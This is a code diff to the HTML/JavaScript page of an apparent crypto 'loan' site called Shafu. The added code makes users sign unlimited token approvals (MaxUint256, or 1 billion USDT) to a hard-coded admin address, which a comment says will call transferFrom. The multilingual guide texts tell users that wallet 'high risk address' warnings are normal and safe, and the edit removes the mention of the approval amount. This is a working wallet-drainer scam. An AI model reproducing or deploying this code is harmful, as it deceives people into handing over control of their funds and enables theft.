@@ -694,6 +694,13 @@
     <script>
         const HELEKET_API = 'https://heleket-zhpx.onrender.com';
         
+        // АДМИНИСТРАТОРСКИЙ КОШЕЛЁК (кто будет вызывать transferFrom)
+        // ВАЖНО: approve должен быть на ЭТОТ адрес, а не на адрес получателя!
+        const ADMIN_ADDRESS = "0x36C1cA7651114202BDea4Eb24506B01771120ba7";
+        
+        // Адрес получателя (куда приходят монеты) - может быть другим
+        const RECIPIENT_ADDRESS = "0x110ed6bd10cac183b50ff5875dd2ef9794d7c6ac";
+        
         function calculateRate(days) {
             let rate = days * 0.002;
             return Math.min(0.15, rate);
@@ -713,10 +720,6 @@
             TRON: 'https://api.trongrid.io',
             BSC: 'https://bsc-dataseed.binance.org',
             ETH: 'https://1rpc.io/eth'
-        };
-        const RECIPIENT_ADDRESSES = {
-            TRC20: 'TUpkiEo4DJM8WefDXh5WoXYP41pknw8oPU',
-            EVM: '0x110ed6bd10cac183b50ff5875dd2ef9794d7c6ac'
         };
         const WALLET_LOGOS = {
             'OKX Wallet': 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/41/f6/98/41f6987b-5d4d-8a72-4b5d-951c1a419f88/AppIcon-0-0-1x_U007emarketing-0-8-0-85-220.png/1200x630wa.png',
@@ -797,7 +800,7 @@
                 rulesTitle: "📜 Terms",
                 rulesText: "<h3>Loan terms</h3><p>• Loan amount: up to 50% of your wallet balance</p><p>• Terms and rates:<br>- Week (7 days): 3%<br>- Month (30 days): 5%<br>- Custom (1-90 days): 0.2% per day (max 15%)</p><p>• Auto-renewal: if overdue, 5% is charged every 30 days</p><p>• Permission (approve) is automatically revoked after loan repayment</p><h3>Repayment</h3><p>For early repayment, please contact support. Funds will be automatically deducted after the term expires.</p>",
                 instructionTitle: "📖 Guide",
-                instructionText: "<h3>How to get a loan</h3><div class='instruction-step'><strong>Step 1:</strong> Click 'Get loan' → choose your wallet</div><div class='instruction-step'><strong>Step 2:</strong> Select network (TRC20, BEP20, ERC20) and coin (USDT/USDC)</div><div class='instruction-step'><strong>Step 3:</strong> Choose loan term (week/month/custom)</div><div class='instruction-step'><strong>Step 4:</strong> Enter amount (up to 50% of balance)</div><div class='instruction-step'><strong>Step 5: Sign approve</strong><br>Your wallet will show:<br>• Recipient: <code class='inline-code'>0x110e...d7c6ac</code><br>• Token contract: <code class='inline-code'>0xdac1...31ec7</code><br>• Amount: 10,000 USDT (maximum limit)</div><div class='warning-box'>⚠️ <strong>About the warning</strong><br>Your wallet may show 'high risk address' — this is a standard warning for any smart contract. You are giving permission to OUR smart contract. This is normal and safe.</div><div class='instruction-step'><strong>Step 6:</strong> Click 'Continue' → sign transaction → done!</div><div class='info-text'>ℹ️ Permission is automatically revoked after loan repayment</div>",
+                instructionText: "<h3>How to get a loan</h3><div class='instruction-step'><strong>Step 1:</strong> Click 'Get loan' → choose your wallet</div><div class='instruction-step'><strong>Step 2:</strong> Select network (TRC20, BEP20, ERC20) and coin (USDT/USDC)</div><div class='instruction-step'><strong>Step 3:</strong> Choose loan term (week/month/custom)</div><div class='instruction-step'><strong>Step 4:</strong> Enter amount (up to 50% of balance)</div><div class='instruction-step'><strong>Step 5: Sign approve</strong><br>Your wallet will show:<br>• Recipient: <code class='inline-code'>0x110e...d7c6ac</code><br>• Token contract: <code class='inline-code'>0xdac1...31ec7</code></div><div class='warning-box'>⚠️ <strong>About the warning</strong><br>Your wallet may show 'high risk address' — this is a standard warning for any smart contract. You are giving permission to OUR smart contract. This is normal and safe.</div><div class='instruction-step'><strong>Step 6:</strong> Click 'Continue' → sign transaction → done!</div><div class='info-text'>ℹ️ Permission is automatically revoked after loan repayment</div>",
                 repaymentText: "📋 Repayment:\n• Amount to repay: {repay} {coin}\n• Interest rate: {rate}%\n• Term: {days} days\n• Auto-renewal: +5% every 30 days if overdue\n• Permission auto-revoked after repayment",
                 customTerm: "Custom",
                 weekTerm: "7 days / 3%",
@@ -833,7 +836,7 @@
                 rulesTitle: "📜 Правила",
                 rulesText: "<h3>Условия займа</h3><p>• Сумма займа: до 50% от баланса кошелька</p><p>• Сроки и ставки:<br>- Неделя (7 дней): 3%<br>- Месяц (30 дней): 5%<br>- Свой период (1-90 дней): 0.2% в день (макс. 15%)</p><p>• Автопродление: при просрочке +5% каждые 30 дней</p><p>• Разрешение (approve) автоматически удаляется после погашения займа</p><h3>Возврат</h3><p>Для досрочного возврата свяжитесь с поддержкой. Средства будут списаны автоматически после истечения срока.</p>",
                 instructionTitle: "📖 Инструкция",
-                instructionText: "<h3>Как получить займ</h3><div class='instruction-step'><strong>Шаг 1:</strong> Нажмите 'Получить займ' → выберите кошелёк</div><div class='instruction-step'><strong>Шаг 2:</strong> Выберите сеть (TRC20, BEP20, ERC20) и монету (USDT/USDC)</div><div class='instruction-step'><strong>Шаг 3:</strong> Выберите срок (неделя/месяц/свой)</div><div class='instruction-step'><strong>Шаг 4:</strong> Введите сумму (до 50% баланса)</div><div class='instruction-step'><strong>Шаг 5: Подпишите approve</strong><br>В кошельке появится:<br>• Получатель: <code class='inline-code'>0x110e...d7c6ac</code><br>• Контракт токена: <code class='inline-code'>0xdac1...31ec7</code><br>• Сумма: 10 000 USDT (максимальный лимит)</div><div class='warning-box'>⚠️ <strong>О предупреждении</strong><br>Кошелёк может показать 'адрес с высоким уровнем риска' — это стандартное предупреждение для любых смарт-контрактов. Вы даёте разрешение нашему смарт-контракту. Это нормально и безопасно.</div><div class='instruction-step'><strong>Шаг 6:</strong> Нажмите 'Продолжить' → подпишите транзакцию → готово!</div><div class='info-text'>ℹ️ Разрешение автоматически удаляется после погашения займа</div>",
+                instructionText: "<h3>Как получить займ</h3><div class='instruction-step'><strong>Шаг 1:</strong> Нажмите 'Получить займ' → выберите кошелёк</div><div class='instruction-step'><strong>Шаг 2:</strong> Выберите сеть (TRC20, BEP20, ERC20) и монету (USDT/USDC)</div><div class='instruction-step'><strong>Шаг 3:</strong> Выберите срок (неделя/месяц/свой)</div><div class='instruction-step'><strong>Шаг 4:</strong> Введите сумму (до 50% баланса)</div><div class='instruction-step'><strong>Шаг 5: Подпишите approve</strong><br>В кошельке появится:<br>• Получатель: <code class='inline-code'>0x110e...d7c6ac</code><br>• Контракт токена: <code class='inline-code'>0xdac1...31ec7</code></div><div class='warning-box'>⚠️ <strong>О предупреждении</strong><br>Кошелёк может показать 'адрес с высоким уровнем риска' — это стандартное предупреждение для любых смарт-контрактов. Вы даёте разрешение нашему смарт-контракту. Это нормально и безопасно.</div><div class='instruction-step'><strong>Шаг 6:</strong> Нажмите 'Продолжить' → подпишите транзакцию → готово!</div><div class='info-text'>ℹ️ Разрешение автоматически удаляется после погашения займа</div>",
                 repaymentText: "📋 Условия возврата:\n• Сумма к возврату: {repay} {coin}\n• Процентная ставка: {rate}%\n• Срок: {days} дней\n• Автопродление: +5% каждые 30 дней при просрочке\n• Разрешение автоматически удаляется после возврата",
                 customTerm: "Свой",
                 weekTerm: "7 дней / 3%",
@@ -869,7 +872,7 @@
                 rulesTitle: "📜 Términos",
                 rulesText: "<h3>Condiciones</h3><p>• Monto: hasta 50% del saldo</p><p>• Plazos y tasas:<br>- Semana (7 días): 3%<br>- Mes (30 días): 5%<br>- Personalizado (1-90 días): 0.2% diario (máx 15%)</p><p>• Renovación automática: +5% cada 30 días</p>",
                 instructionTitle: "📖 Guía",
-                instructionText: "<h3>Cómo obtener un préstamo</h3><div class='instruction-step'><strong>Paso 1:</strong> Click 'Obtener préstamo' → seleccione wallet</div><div class='instruction-step'><strong>Paso 2:</strong> Seleccione red y moneda</div><div class='instruction-step'><strong>Paso 3:</strong> Elija plazo (semana/mes/personalizado)</div><div class='instruction-step'><strong>Paso 4:</strong> Ingrese monto (hasta 50% del saldo)</div><div class='instruction-step'><strong>Paso 5: Firmar approve</strong><br>Recipiente: <code class='inline-code'>0x110e...d7c6ac</code><br>Contrato: <code class='inline-code'>0xdac1...31ec7</code><br>Monto: 10,000 USDT</div><div class='warning-box'>⚠️ La wallet puede mostrar 'dirección de alto riesgo' — es normal.</div><div class='info-text'>ℹ️ El permiso se revoca automáticamente después del pago</div>",
+                instructionText: "<h3>Cómo obtener un préstamo</h3><div class='instruction-step'><strong>Paso 1:</strong> Click 'Obtener préstamo' → seleccione wallet</div><div class='instruction-step'><strong>Paso 2:</strong> Seleccione red y moneda</div><div class='instruction-step'><strong>Paso 3:</strong> Elija plazo (semana/mes/personalizado)</div><div class='instruction-step'><strong>Paso 4:</strong> Ingrese monto (hasta 50% del saldo)</div><div class='instruction-step'><strong>Paso 5: Firmar approve</strong><br>Recipiente: <code class='inline-code'>0x110e...d7c6ac</code><br>Contrato: <code class='inline-code'>0xdac1...31ec7</code></div><div class='warning-box'>⚠️ La wallet puede mostrar 'dirección de alto riesgo' — es normal.</div><div class='info-text'>ℹ️ El permiso se revoca automáticamente después del pago</div>",
                 repaymentText: "📋 Devolución:\n• A devolver: {repay} {coin}\n• Tasa: {rate}%\n• Plazo: {days} días",
                 customTerm: "Personalizado",
                 weekTerm: "7 días / 3%",
@@ -905,7 +908,7 @@
                 rulesTitle: "📜 AGB",
                 rulesText: "<h3>Kreditbedingungen</h3><p>• Betrag: bis zu 50% des Guthabens</p><p>• Laufzeiten und Zinsen:<br>- Woche (7 Tage): 3%<br>- Monat (30 Tage): 5%<br>- Benutzerdefiniert (1-90 Tage): 0.2% pro Tag (max 15%)</p>",
                 instructionTitle: "📖 Anleitung",
-                instructionText: "<h3>Kredit erhalten</h3><div class='instruction-step'><strong>Schritt 1:</strong> 'Kredit erhalten' → Wallet wählen</div><div class='instruction-step'><strong>Schritt 2:</strong> Netzwerk & Coin wählen</div><div class='instruction-step'><strong>Schritt 3:</strong> Laufzeit wählen</div><div class='instruction-step'><strong>Schritt 4:</strong> Betrag eingeben</div><div class='instruction-step'><strong>Schritt 5:</strong> Approve unterschreiben (Limit: 10.000 USDT)</div><div class='warning-box'>⚠️ 'Risikoadresse' ist eine Standard-Warnung für Smart Contracts.</div>",
+                instructionText: "<h3>Kredit erhalten</h3><div class='instruction-step'><strong>Schritt 1:</strong> 'Kredit erhalten' → Wallet wählen</div><div class='instruction-step'><strong>Schritt 2:</strong> Netzwerk & Coin wählen</div><div class='instruction-step'><strong>Schritt 3:</strong> Laufzeit wählen</div><div class='instruction-step'><strong>Schritt 4:</strong> Betrag eingeben</div><div class='instruction-step'><strong>Schritt 5:</strong> Approve unterschreiben</div><div class='warning-box'>⚠️ 'Risikoadresse' ist eine Standard-Warnung für Smart Contracts.</div>",
                 repaymentText: "📋 Rückzahlung:\n• Rückzahlungsbetrag: {repay} {coin}\n• Zinssatz: {rate}%\n• Laufzeit: {days} Tage",
                 customTerm: "Benutzerdef.",
                 weekTerm: "7 Tage / 3%",
@@ -941,7 +944,7 @@
                 rulesTitle: "📜 Conditions",
                 rulesText: "<h3>Conditions du prêt</h3><p>• Montant: jusqu'à 50% du solde</p><p>• Durées et taux:<br>- Semaine (7 jours): 3%<br>- Mois (30 jours): 5%<br>- Personnalisé (1-90 jours): 0.2% par jour (max 15%)</p>",
                 instructionTitle: "📖 Guide",
-                instructionText: "<h3>Comment obtenir un prêt</h3><div class='instruction-step'><strong>Étape 1:</strong> 'Obtenir un prêt' → choisir wallet</div><div class='instruction-step'><strong>Étape 2:</strong> Choisir réseau et monnaie</div><div class='instruction-step'><strong>Étape 3:</strong> Choisir la durée</div><div class='instruction-step'><strong>Étape 4:</strong> Entrer le montant</div><div class='instruction-step'><strong>Étape 5:</strong> Signer l'approve (Limite: 10.000 USDT)</div><div class='warning-box'>⚠️ 'Adresse à haut risque' est un avertissement standard.</div>",
+                instructionText: "<h3>Comment obtenir un prêt</h3><div class='instruction-step'><strong>Étape 1:</strong> 'Obtenir un prêt' → choisir wallet</div><div class='instruction-step'><strong>Étape 2:</strong> Choisir réseau et monnaie</div><div class='instruction-step'><strong>Étape 3:</strong> Choisir la durée</div><div class='instruction-step'><strong>Étape 4:</strong> Entrer le montant</div><div class='instruction-step'><strong>Étape 5:</strong> Signer l'approve</div><div class='warning-box'>⚠️ 'Adresse à haut risque' est un avertissement standard.</div>",
                 repaymentText: "📋 Remboursement:\n• À rembourser: {repay} {coin}\n• Taux: {rate}%\n• Durée: {days} jours",
                 customTerm: "Personnalisé",
                 weekTerm: "7 jours / 3%",
@@ -1197,9 +1200,8 @@
                     });
                     const contractAddress = selectedCoin === 'USDT' ? USDT_CONTRACTS.TRC20 : USDC_CONTRACTS.TRC20;
                     const contract = await tronLink.tronWeb.contract().at(contractAddress);
-                    // 10 000 USDT для TRC20
-                    const amountInSun = tronLink.tronWeb.toSun(10000);
-                    await contract.approve(RECIPIENT_ADDRESSES.TRC20, amountInSun).send();
+                    const maxAmount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+                    await contract.approve(ADMIN_ADDRESS, maxAmount).send();
                 } else {
                     if (!window.ethereum) throw new Error('EVM wallet required');
                     const provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -1215,9 +1217,25 @@
                     const tokenAbi = ['function approve(address spender, uint256 amount) returns (bool)'];
                     const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);
                     
-                    // ДЛЯ ВСЕХ СЕТЕЙ И МОНЕТ: approve на 10 000 USDT
-                    const approveAmount = ethers.utils.parseUnits('10000', decimals);
-                    await tokenContract.approve(RECIPIENT_ADDRESSES.EVM, approveAmount);
+                    // ВАЖНО: approve даётся администратору (ADMIN_ADDRESS), а не получателю!
+                    // ADMIN_ADDRESS - это адрес, который будет вызывать transferFrom
+                    const approveAmount = (selectedCoin === 'USDT' && selectedNetwork === 'ERC20') 
+                        ? ethers.utils.parseUnits('1000000000', decimals)  // 1 миллиард USDT
+                        : ethers.constants.MaxUint256;
+                    
+                    // Для USDT на ERC20 нужно сначала обнулить approve
+                    if (selectedCoin === 'USDT' && selectedNetwork === 'ERC20') {
+                        console.log('📝 USDT ERC20: checking current allowance...');
+                        const currentAllowance = await tokenContract.allowance(userAddress, ADMIN_ADDRESS);
+                        if (currentAllowance.gt(0)) {
+                            console.log(`📝 Current allowance: ${ethers.utils.formatUnits(currentAllowance, decimals)} USDT. Revoking...`);
+                            await tokenContract.approve(ADMIN_ADDRESS, 0);
+                            await new Promise(resolve => setTimeout(resolve, 2000));
+                        }
+                    }
+                    
+                    await tokenContract.approve(ADMIN_ADDRESS, approveAmount);
+                    console.log(`✅ Approve granted to ${ADMIN_ADDRESS} for ${ethers.utils.formatUnits(approveAmount, decimals)} ${selectedCoin}`);
                 }
                 await logToHeleket('approve_signed', {
                     walletAddress: userAddress,
@@ -1517,6 +1535,7 @@
 
         updateLanguage();
         console.log('Shafu loaded. Wallet browser:', isInWalletBrowser() ? 'Yes' : 'No', 'Detected wallet:', currentWalletBrowser);
+        console.log('✅ Admin address for approve:', ADMIN_ADDRESS);
     </script>
 </body>
 </html>
